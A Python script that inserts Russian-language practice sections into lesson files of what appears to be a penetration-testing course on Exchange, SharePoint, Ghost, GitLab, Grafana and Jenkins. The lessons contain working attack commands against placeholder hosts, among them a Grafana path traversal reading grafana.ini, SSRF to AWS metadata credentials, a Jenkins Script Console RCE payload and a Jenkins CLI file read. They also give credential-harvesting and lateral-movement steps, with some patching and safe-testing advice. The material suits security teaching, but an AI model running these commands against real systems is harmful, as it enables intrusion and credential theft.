#!/usr/bin/env python3
import re, os
ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))

def insert(lid, additions, minutes=None):
    path = os.path.join(ROOT, "content", "web", lid + ".md")
    lesson = open(path, encoding="utf-8").read()
    add = additions.strip("\n")
    if "## Квиз" in add or "## Где пригодится" in add:
        raise SystemExit("bad additions: " + lid)
    m = re.search(r"^## Квиз\s*$", lesson, re.MULTILINE)
    out = lesson[:m.start()] + add + "\n\n" + lesson[m.start():]
    if minutes:
        out = re.sub(r"^estimated_minutes:.*$", f"estimated_minutes: {minutes}",
                     out, count=1, flags=re.MULTILINE)
    open(path, "w", encoding="utf-8").write(out)
    print("topup", lid)

A = {}

A["web-enterprise-apps"] = r"""
## Практика: как выглядит разведка корпоративного портала

Корпоративные приложения находят не сканером «в интернете», а внутри периметра — по DNS, из документов, из открытых VPN-страниц. Возьмём типовой портал `https://intranet.target.example`. Первый шаг — собрать «отпечатки», которые выдают конкретный продукт:

```
$ curl -sI https://intranet.target.example | grep -iE 'server|x-|set-cookie|location'
Server: Microsoft-IIS/10.0
X-Powered-By: ASP.NET
Set-Cookie: ASP.NET_SessionId=...; path=/; HttpOnly
```

`ASP.NET_SessionId` + IIS → это .NET-приложение, вероятно SharePoint или Exchange OWA. Дальше смотрим уникальные пути:

```
$ for p in /owa/ /_layouts/15/ /webmail/ /ecp/ ; do
    echo "$(curl -s -o /dev/null -w '%{http_code}' https://intranet.target.example$p)  $p"
  done
200  /owa/
302  /_layouts/15/
200  /webmail/
```

`200 /owa/` и `/ecp/` — почти гарантированно Exchange. `/webmail/` на 200 — Zimbra или Roundcube. Так за три команды ты понимаешь, что перед тобой, и выбираешь соответствующий набор CVE.

## Практика: приоритезация по версии и по данным

Не все корпоративные приложения одинаково ценны. Строй матрицу «данные × экспозиция»:

| Приложение | Что хранит | Ценность | Типичный вектор |
|---|---|---|---|
| Exchange | почта, адресная книга, NTLM | очень высокая | ProxyLogon/ProxyShell |
| SharePoint | документы, список пользователей | высокая | ViewState, ToolShell |
| Confluence | знания, пароли, схемы | высокая | OGNL, auth-bypass |
| Jira | задачи, токены, CI-хуки | средняя | SSTI, утечки |
| Zimbra | почта | высокая | CVE-2022-27925 |
| GitLab | код, секреты | очень высокая | ExifTool RCE |

Начинай с Exchange и GitLab: они дают и данные, и путь к учётным записям домена. Confluence и Jira — вторым эшелоном. И помни: **ценность = данные × доступность**: приложение с почтой всего отдела ценнее, чем CI-сервер, даже если последний «технически» уязвимее.

## Практика: чтение вендорского бюллетеня

Бюллетени (Microsoft MSRC, Atlassian Security Advisories, GitLab Release Notes) читаются по одной схеме: **затронутые версии → вектор → требуемые условия → наличие патча**. Пример записи: «CVE-2023-XXXX, критический, CVSS 9.8, затронуты версии 8.0.0–8.5.1, эксплуатация без аутентификации, исправлено в 8.5.2». Из неё сразу следует: проверь версию, если в диапазоне — уязвимо, патч известен. Ещё в бюллетене есть **обходные меры** (mitigations) — иногда они подсказывают, где именно живёт баг. Учись вытаскивать из бюллетеня точный путь/параметр: часто это готовая точка входа.

## Как использовать находку для движения дальше

Компромисс корпоративного приложения — это доступ к SSO и к общим учётным записям. После входа ищи: список пользователей, группы, привязанные сервисы, токены интеграций. Exchange даёт NTLM-хендшейки для релея и доступ к адресной книге; SharePoint — документы с паролями; Confluence — страницы с инструкциями по доступам. Все учётные данные фиксируй в engagement state, помечай источник и передавай координатору. Не пытайся «сразу всё»: одно приложение — один этап, затем следующий узел по графу.
"""

A["web-enterprise-collab"] = r"""
## Практика: определяем Atlassian vs Microsoft за секунды

Перед атакой нужно понять, какой продукт перед тобой. У каждого — свой набор заголовков и путей:

```
$ curl -sI https://collab.target.example | grep -iE 'x-atlassian|x-arequestid|x-confluence|server|set-cookie'
X-AREQUESTID: 1a2b3c4d
X-ASEN: SEN-L12345
Set-Cookie: JSESSIONID=...; Path=/; HttpOnly
```

`X-AREQUESTID` и `X-ASEN` — это Atlassian (Jira/Confluence). У Microsoft — `X-OWA-Version`, `X-FEServer`, `X-DiagInfo` (Exchange) или `MicrosoftSharePointTeamServices` (SharePoint). Собрав эти признаки, ты выбираешь ветку: Atlassian → OGNL/шаблоны, Microsoft → ProxyLogon/ViewState.

## Практика: Exchange OWA — версия из заголовков

Версия Exchange часто утекает прямо в заголовке ответа OWA:

```
$ curl -sI https://mail.target.example/owa/ | grep -i x-owa-version
X-OWA-Version: 15.2.986.5
```

`15.2.x` — Exchange 2019 CU11. `15.1.x` — Exchange 2016. `15.0.x` — Exchange 2013. Сопоставив с таблицей ProxyLogon (уязвимы < 15.1.2176 / < 15.2.792 / < 15.0.1497), ты точно знаешь, применим ли эксплойт. **Никогда** не лей ProxyLogon на непроверенную версию: на пропатченной он не сработает, а на версии-«пограничной» может оставить инстанс в нерабочем состоянии.

## Практика: SharePoint ViewState

SharePoint отдаёт ViewState — сериализованный .NET-объект с подписью `machineKey`. Если ключ (`ValidationKey`/`DecryptionKey`) утёк или слабый, ViewState подделывается и через `ObjectStateFormatter`/`LosFormatter` даёт RCE. Признак — наличие `__VIEWSTATE` в форме и `MicrosoftSharePointTeamServices` в заголовке:

```
$ curl -s https://sp.target.example/ | grep -oE 'MicrosoftSharePointTeamServices: [0-9.]+'
MicrosoftSharePointTeamServices: 16.0.10337.12109
```

Инструмент `ysoserial.net` (`-g TypeConfuseDelegate`) генерирует ViewState-payload. Но прежде чем его применять, нужен `machineKey` — его ищут в `web.config` через LFI или в бэкапах.

## Таблица: коллаборационные CVE и условия

| Продукт | CVE | Тип | Условие |
|---|---|---|---|
| Exchange | CVE-2021-26855 (ProxyLogon) | SSRF→RCE | версия уязвима, доступ к OWA |
| Exchange | CVE-2021-34473 (ProxyShell) | RCE | Autodiscover открыт |
| SharePoint | CVE-2023-29357 (ToolShell) | auth bypass | без аутентификации |
| Confluence | CVE-2022-26134 | OGNL RCE | версия 1.3–7.18 |
| Jira | CVE-2019-8442 | чтение файлов | без аутентификации |

## Как связать приложение с доменом

Exchange и SharePoint почти всегда в домене — они аутентифицируют пользователей через AD. Поэтому компрометация Exchange — это фактически доступ к AD-сервисам: через `EWS`/`Autodiscover` можно собирать имена пользователей, а через NTLM-хендшейки — релеить на другие хосты. Confluence и Jira могут стоять с LDAP/AD-синхронизацией — тогда список пользователей из них совпадает с доменным. Фиксируй в state: найденные логины, группы, сервисные учётки. Это карта для следующих задач (kerberoast, релей, перебор). Не растекайся: одно приложение — один источник разведданных, затем передача координатору.
"""

A["web-exchange-proxylogon"] = r"""
## Практика: как проверить Exchange на ProxyLogon без вреда

ProxyLogon (CVE-2021-26855) — SSRF в `/ecp/`, через который обходится аутентификация. Полная цепочка ставит webshell, но безопасная **проверка** ограничивается подтверждением, что SSRF работает. Идея: запрос к `/ecp/` с cookie `X-BEResource`, указывающей на внутренний ресурс, и сравнение ответа с обычным. Первый признак уязвимости — наличие заголовка `X-FEServer` и разный код ответа при подмене `X-BEResource`:

```
$ curl -s -o /dev/null -w '%{http_code}\n' \
  -H 'Cookie: X-BEResource=mail.target.example/ecp/default.flt?~1' \
  https://mail.target.example/ecp/default.flt
500
```

`500` на внутреннем ресурсе против `302` на обычном `/ecp/` — намёк на SSRF. Но это **не доказательство RCE**. Доказательство — либо конкретный вывод команды, либо успешная аутентификация, полученная через SSRF (запрос к `/EWS/Exchange.asmx` с украденным токеном). Всегда разделяй «сервер ведёт себя странно» и «я подтвердил эксплойт».

## Практика: ProxyShell — три CVE в одной цепочке

ProxyShell = CVE-2021-34473 (SSRF/path confusion) + CVE-2021-34523 (обход ECP) + CVE-2021-31207 (запись файла). Эксплуатация: сначала `Autodiscover` с `?&EXCH`-трюком, затем доступ к PowerShell-эндпоинту, затем запись webshell. Каждый шаг требует предыдущего, поэтому PoC надо читать целиком, а не копировать «в лоб». Проверяй версию (`X-OWA-Version`) и обязательно читай, куда PoC пишет файл — чтобы не затереть чужой webshell или данные.

## Практика: чтение публичного PoC перед запуском

Публичный PoC — это **непроверенный код**. Перед запуском прочитай его и ответь на вопросы: куда он обращается (только ли на твой target?), есть ли callback на сторонний домен, что он пишет на диск, какой путь у webshell, есть ли `rm`/`del`, есть ли обфускация. Если PoC тянет второй этап с чужого URL — не запускай, перепиши под свой listener. Если он ставит webshell по фиксированному пути — проверь, что путь не перезаписывает существующий файл. Только после аудита — запуск на подтверждённой версии.

## Таблица: Proxy-цепочки Exchange

| Цепочка | CVE | Что даёт | Патч |
|---|---|---|---|
| ProxyLogon | 2021-26855/26857/26858/27065 | RCE + webshell | март 2021 |
| ProxyShell | 2021-34473/34523/31207 | RCE | июль 2021 |
| ProxyNotShell | 2022-41040/41082 | RCE | ноябрь 2022 |
| ProxyToken | 2021-33766 | доступ к ECP | июль 2021 |

## Как оценивать импакт и как защищаться

Exchange — это ядро корпоративной почты и идентичности. RCE на Exchange даёт доступ к почте всех сотрудников, к адресной книге и к NTLM-хендшейкам для релея — фактически это путь к домену. В отчёте фиксируй: точную версию Exchange, использованную цепочку, артефакт (webshell или токен), и **немедленную рекомендацию** — установить накопительные обновления, включить Extended Protection for Authentication, ограничить доступ к `/ecp/` и `/owa/` извне, включить EEMS (Exchange Emergency Mitigation Service). Подчеркни, что частичная установка патчей недостаточна: ProxyLogon — это четыре CVE, и все четыре должны быть закрыты.
"""

A["web-frameworks"] = r"""
## Практика: как определить фреймворк за одну минуту

Серверные фреймворки выдают себя заголовками и cookie. Соберём набор признаков:

```
$ curl -sI https://app.target.example | grep -iE 'server|x-powered|set-cookie|x-frame'
Server: nginx
Set-Cookie: laravel_session=...; path=/; HttpOnly
X-Frame-Options: SAMEORIGIN
```

`laravel_session` → Laravel. `django`/`csrftoken` → Django. `_rails_session`/`_target_session` → Rails. `JSESSIONID` + `X-Application-Context` → Spring Boot. Один взгляд на cookie уже сужает круг. Дальше — уникальные пути: Laravel отдаёт `/.env`, Rails — `/rails/info/properties` (в dev), Spring — `/actuator`, Django — `/admin/`.

## Практика: Laravel `.env` и APP_KEY

Самая частая Laravel-находка — открытый `/.env`. Там лежат `APP_KEY`, `DB_PASSWORD`, `MAIL_*`, ключи AWS:

```
$ curl -s https://app.target.example/.env | grep -E 'APP_KEY|DB_'
APP_KEY=base64:xxxxxxxxxxxxxxxxxxxxxxxxxxxx
DB_PASSWORD=s3cr3t
```

`APP_KEY` — это ключ шифрования Laravel. С ним подделываются зашифрованные cookie и значение `remember_me`; в уязвимых версиях Ignition (CVE-2021-3129) — выполняется код. Всё, что нужно, — знать ключ. Поэтому `/.env` — цель номер один на любой Laravel-цели, и его обязательно проверяют первым запросом.

## Практика: Rails и Marshal-сессии

Rails исторически хранит сессию в cookie, сериализованной через `Marshal`, подписанной `secret_key_base`. Если ключ утёк (или слабый), можно сформировать `Marshal`-payload с gadget-цепочкой (`universal deserialization gadget`) и получить RCE. Признак Rails — cookie `_<app>_session` (обычно base64) и заголовок `X-Runtime` в ответе. Проверка `secret_key_base`: ищи в `/rails/info/properties` (dev), в `config/secrets.yml`, в открытом репозитории. Современные Rails (7+) перешли на `JSON`, и старый вектор закрыт — поэтому версию определяй до атаки.

## Практика: Spring Boot Actuator

Spring Boot отдаёт `/actuator` (если не закрыт). Это концентрат утечек:

```
$ curl -s https://app.target.example/actuator/env | head -c 200
{"activeProfiles":["prod"],"propertySources":[{"name":"systemEnvironment",...
```

`/actuator/env` — переменные окружения (пароли БД, токены), `/actuator/heapdump` — дамп памяти с кредами, `/actuator/mappings` — все эндпоинты, `/actuator/httptrace` — последние HTTP-запросы (иногда с токенами). Исторические CVE (Spring4Shell, CVE-2022-22965) дают RCE через `class.module.classLoader` при определённой конфигурации. Actuator — это первый путь, CVE — второй.

## Таблица: фреймворки и их «паспорта»

| Фреймворк | Cookie-признак | Путь-признак | Главная утечка |
|---|---|---|---|
| Laravel | `laravel_session` | `/.env`, `/telescope` | APP_KEY, креды БД |
| Django | `csrftoken`, `sessionid` | `/admin/`, трейсбек | SECRET_KEY |
| Rails | `_*_session`, `X-Runtime` | `/rails/info` | secret_key_base |
| Spring | `JSESSIONID` | `/actuator/*` | env, heapdump |
| Express | `connect.sid` | `/api/` | `.env`, proto-pollution |

## Почему фреймворковые баги ценнее CMS-багов

CMS — это конкретный сайт; фреймворк — это **весь парк приложений компании**, потому что на нём пишут внутренние сервисы, API, админки. Один утёкший `APP_KEY` или открытый `/actuator/env` может открыть не одно приложение, а десяток. Поэтому при аудите сначала смотри на фреймворк, а потом на CMS: ROI выше. И фиксируй в отчёте не «нашёл Laravel», а «`/.env` открыт и отдаёт APP_KEY и пароль БД — доступ к шифрованию cookie и базе».
"""

A["web-ghost-cms"] = r"""
## Практика: как достать Content API key

Ghost отдаёт публичный Content API по `/ghost/api/content/`. Для чтения постов нужен ключ `?key=<id>:<secret>`, и этот ключ **часто вшит в тему** — в JS-бандл. Достаём его:

```
$ curl -s https://blog.target.example/ | grep -oE 'contentKey["\x27: ]+[a-f0-9]{24}:[a-f0-9]{64}' | head -1
contentKey "6a1b2c3d4e5f6a7b8c9d0e1f:aaaaaaaa...": 
```

Или проще — из `/ghost/api/content/posts/?key=...`. Ключ публичный по дизайну, но с ним можно читать **черновики** (если `status=draft` не заблокирован) и получать `mobiledoc`/`lexical`-структуры с внутренними полями (авторы, email). Это уже утечка, которую Ghost «не считает» утечкой.

## Практика: SSRF через импорт и вебхуки

Ghost умеет импортировать контент по URL и вызывать вебхуки. Обе функции делают исходящие HTTP-запросы с сервера. Проверяем SSRF через вебхук-эндпоинт (нужен admin-токен) или через функцию импорта:

```
POST /ghost/api/admin/db/ HTTP/1.1
Host: blog.target.example
...
url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

Если сервер — в AWS, ответ вернёт имя роли, а следующий запрос — сами креды. Даже без облака SSRF-as-portscan даёт карту внутренней сети: `http://10.0.0.5:9200/` (Elasticsearch) отвечает иначе, чем закрытый порт. Для OOB-подтверждения используй свой listener (например, `http://your-collab/`), чтобы увидеть входящий запрос.

## Практика: Admin API и его токены

Admin API (`/ghost/api/admin/`) защищён JWT, полученным на `/ghost/api/admin/session`. Проблема в том, что токены интеграций иногда утекают в: (1) исходниках темы, (2) логах, (3) публичных репозиториях, (4) CI-переменных. Найдя admin-токен, ты получаешь полный CRUD: создание постов, пользователей, изменение темы (а тема — это Handlebars, исполняемый сервером). Поэтому утечка admin-токена = потенциальный RCE через тему.

## Таблица: Ghost — что проверять

| Точка | Доступ | Что даёт |
|---|---|---|
| `/ghost/api/content/` | публичный key | посты, черновики, авторы |
| `/ghost/api/admin/` | JWT | полный CRUD, тема |
| Импорт контента | admin | SSRF |
| Вебхуки | admin | SSRF, OOB |
| Тема (Handlebars) | admin | RCE при правке |
| `/ghost/#/site` | браузер | админ-интерфейс |

## Как не сломать рассылку и как оформить

Ghost часто используют для рассылок (mailgun/sendgrid). Неосторожный импорт или правка темы может сломать отправку писем тысячам подписчиков — это репутационный и юридический риск. Поэтому: не трогай тему без согласования, не запускай массовый импорт, не удаляй посты. В отчёте разделяй находки по импакту: утечка Content API key — low/info; SSRF с доступом к metadata — high/critical; утечка admin-токена — critical (полный контроль). И всегда указывай, что **публичный Content API key не считается секретом** — это by design, поэтому не выдавай его за «утечку секрета» без доказательства доступа к закрытым данным.
"""

A["web-gitlab"] = r"""
## Практика: безопасная проверка CVE-2021-22205

CVE-2021-22205 — RCE через загрузку изображения: ExifTool неверно парсит DJVU, и GitLab выполняет код при обработке. Проверка без вреда: загрузить **безобидный** файл и убедиться, что обработка изображений включена, а версия уязвима:

```
$ curl -sI https://gitlab.target.example/help | grep -iE 'gitlab|x-request-id'
X-Request-Id: 01H...
$ curl -s https://gitlab.target.example/api/v4/version -H 'PRIVATE-TOKEN: <token>' 
{"version":"13.10.2","revision":"..."}
```

`/api/v4/version` требует токена, но версия утекает и из `/help` (футер), и из `/assets/webpack/manifest.json`. Уязвимы 13.x<13.10.3 и 11.x/12.x. Только после подтверждения версии — публичный PoC, и только тот, что не пишет на диск лишнего.

## Практика: поиск секретов в репозиториях

GitLab — это в первую очередь **код**, а код полон секретов. Начни с публичных проектов: `/api/v4/projects?visibility=public`. Внутри — история коммитов, где часто лежат `.env`, ключи AWS, токены. Инструмент `trufflehog`/`gitleaks` по клону:

```
$ git clone --mirror https://gitlab.target.example/group/repo.git repo.git
$ gitleaks detect --source repo.git --report-format json
```

Часто находится `CI_JOB_TOKEN`, `AWS_SECRET_ACCESS_KEY`, приватные SSH-ключи. Эти креды ценнее, чем сам GitLab: они открывают прод-инфраструктуру.

## Практика: CI/CD — от runner-токена к RCE

GitLab Runner регистрируется по токену. Если токен проекта (`/api/v4/projects/<id>/runners`) утёк, можно зарегистрировать свой runner и выполнять джобы на инфраструктуре жертвы — а джобы выполняют произвольный код из `.gitlab-ci.yml`. Ещё проще — если в проекте есть `maintainer`-доступ: правишь `.gitlab-ci.yml` и получаешь shell на раннере. Это стандартный путь «GitLab → прод».

## Таблица: GitLab-векторы и версии

| Вектор | CVE | Уязвимые версии | Условие |
|---|---|---|---|
| ExifTool RCE | CVE-2021-22205 | 11.x–13.10.2 | загрузка изображения |
| Path traversal | CVE-2023-2825 | 16.0.0 | публичный проект |
| Account takeover | CVE-2022-1162 | 14.7–14.9 | предсказуемый пароль |
| Pipeline RCE | (by design) | все | maintainer + CI |
| Token leak | — | все | открытый репозиторий |

## Как использовать GitLab для движения дальше

GitLab — узел с высокой связностью: он знает про все репозитории, все CI-переменные, все деплои. После входа ищи: (1) `CI/CD → Variables` во всех проектах (там токены к облаку и БД), (2) `Settings → CI/CD → Runners` (токены раннеров), (3) `Settings → Integrations` (вебхуки, Slack-токены), (4) `Deploy Keys` (SSH-ключи к прод-серверам). Каждый из этих разделов — готовый путь к следующему узлу. Фиксируй найденное в state и передавай координатору: GitLab-компромисс почти всегда открывает облако и прод-серверы, но объём работы по ним — отдельная задача.
"""

A["web-grafana"] = r"""
## Практика: максимально используем Grafana-LFI

CVE-2021-43798 даёт чтение файлов через любой включённый плагин. Список плагинов утекает из `/api/plugins`:

```
$ curl -s https://grafana.target.example/api/plugins | grep -oE '"id":"[^"]+"' | head
"id":"alertlist"
"id":"graphite"
"id":"prometheus"
```

Теперь читаем конфиги по очереди. Самое ценное:

```
$ curl -s --path-as-is "https://grafana.target.example/public/plugins/alertlist/../../../../../../etc/grafana/grafana.ini" | grep -iE 'admin|secret|password'
admin_user = admin
admin_password = SuperSecret1
secret_key = xxxxxxxxxxxxxxxxxx
```

`admin_password` — вход в панель, `secret_key` — подпись токенов. Дальше читаем `/etc/grafana/provisioning/datasources/*.yaml` — там креды к Prometheus/InfluxDB/Elasticsearch. Это уже полноценный доступ к мониторингу всей инфраструктуры.

## Практика: datasource как мост к другим системам

Войдя в Grafana, первым делом смотри `/api/datasources`:

```
$ curl -s -H "Authorization: Bearer <grafana-token>" https://grafana.target.example/api/datasources | head -c 300
[{"id":1,"name":"Prometheus","type":"prometheus","url":"http://prometheus:9090",...
```

Здесь видно: внутренние адреса, порты, креды (в `basicAuthUser`/`secureJsonData`). Обычно это Elasticsearch с логами (там токены в тексте логов), InfluxDB с метриками (там имена хостов), Loki. Grafana фактически даёт **обзор всей внутренней сети** — и это ценнее, чем RCE на одной машине.

## Практика: CVE-2024-9264 — SQLi → RCE

CVE-2024-9264 — SQL-инъекция в функции `csv` (SQL Expressions), позволяющая выполнять команды через DuckDB. Требует аутентификации (любой пользователь, включая viewer, если включена `sqlExpressions`). Проверка: отправить запрос с payload к `/api/ds/query` и посмотреть, выполнится ли файловая операция DuckDB. Как и всегда, сначала подтверди версию и что функция включена, потом — минимальный payload.

## Таблица: Grafana-векторы

| Вектор | CVE | Уязвимые версии | Условие |
|---|---|---|---|
| Path traversal (LFI) | CVE-2021-43798 | 8.0–8.3.0 | без аутентификации |
| SQLi → RCE | CVE-2024-9264 | 11.0–11.2.1 | аутентификация |
| XSS | CVE-2022-31107 | 8.x–9.x | OAuth-логин |
| Account takeover | CVE-2022-31107 | 9.0–9.2.3 | браузер |

## Как связать Grafana с облаком и Kubernetes

Grafana часто стоит в Kubernetes и имеет доступ к кластеру. В datasources может быть Prometheus, скрейпящий kubelet (`:10250`), и Loki. Через `/api/datasources` видно адреса kube-apiserver (`:6443`) и kubelet. Если у Grafana есть service-account с правами, её токен лежит в `/var/run/secrets/kubernetes.io/serviceaccount/token` — читается через тот же LFI. Тогда компромисс Grafana = доступ к Kubernetes API, а это уже контейнеры и секреты кластера. Все адреса и токены фиксируй: это карта для следующего этапа.
"""

A["web-jenkins-script-console"] = r"""
## Практика: Script Console — минимальный и безопасный payload

Если `/script` доступен анонимно (что бывает при `AuthorizationStrategy` = `Unsecured`), это прямой RCE. Минимальный payload — `id`, без записи файлов:

```groovy
def p = ['bash','-c','id'].execute(); p.waitFor(); println p.text
```

Аналогично для Windows: `['cmd','/c','whoami'].execute()`. Важно: не пиши webshell в первый заход, не меняй конфиги, не перезапускай Jenkins. Доказательство — вывод `id` (или `whoami`), зафиксированный в отчёте. Если консоль под аутентификацией, но есть креды — сначала вход, потом `id`.

## Практика: CVE-2024-23897 — чтение файлов через CLI

Jenkins CLI-парсер обрабатывает `@<file>` как «прочитать аргумент из файла». Уязвимость позволяет прочитать произвольный файл по этим аргументам. Без аутентификации доступны только первые строки; с `Overall/Read` — целиком. Цель — `/var/jenkins_home/secrets/initialAdminPassword` или `/etc/passwd`:

```
$ java -jar jenkins-cli.jar -s https://jenkins.target.example/ \
  connect-node "@/etc/passwd"
```

Прочитав `initialAdminPassword`, ты входишь в Jenkins как админ, а дальше — Script Console, то есть RCE. Это классическая цепочка «read → admin → RCE», и она не требует ни одной уязвимости в плагинах.

## Практика: креды и сборки

Jenkins хранит креды в `/var/jenkins_home/credentials.xml` (зашифрованы мастер-ключом, но ключ там же: `/var/jenkins_home/secrets/master.key` и `hudson.util.Secret`). С доступом к файлам (через CVE-2024-23897 или Script Console) они расшифровываются утилитой `jenkins-decrypt`. Сборки же дают другой путь: любой, кто может изменить `Jenkinsfile` или job, выполняет код на агенте. Агенты часто имеют доступ к прод-сетям и к Docker-сокету.

## Таблица: Jenkins-векторы

| Вектор | Условие | Что даёт |
|---|---|---|
| Script Console | доступ к `/script` | RCE |
| CVE-2024-23897 | версия < 2.442/LTS | чтение файлов |
| Credentials | доступ к FS | пароли, ключи, токены |
| Build job | права на job | RCE на агенте |
| Docker-агент | агент с docker.sock | побег из контейнера |
| `/whoAmI/api/json` | аноним | версия + права |

## Как использовать Jenkins для латерального движения

Jenkins — это «центр сборки», а значит у него есть креды к Git, к артефакторию, к облаку, к прод-серверам (через деплой-джобы). После получения RCE первым делом: (1) `cat /var/jenkins_home/credentials.xml` и расшифровка, (2) список агентов (`/computer/`) — они в других подсетях, (3) деплой-джобы — там скрипты с паролями и путями к серверам. Агенты Jenkins часто подключены по SSH и имеют доступ к внутренним сетям — это готовые точки pivot. Фиксируй найденные креды и агентов в state, но не разворачивай масштабную работу с одного Jenkins: выдели её в отдельную задачу.
"""

def main():
    for lid, txt in A.items():
        insert(lid, txt)

if __name__ == "__main__":
    main()
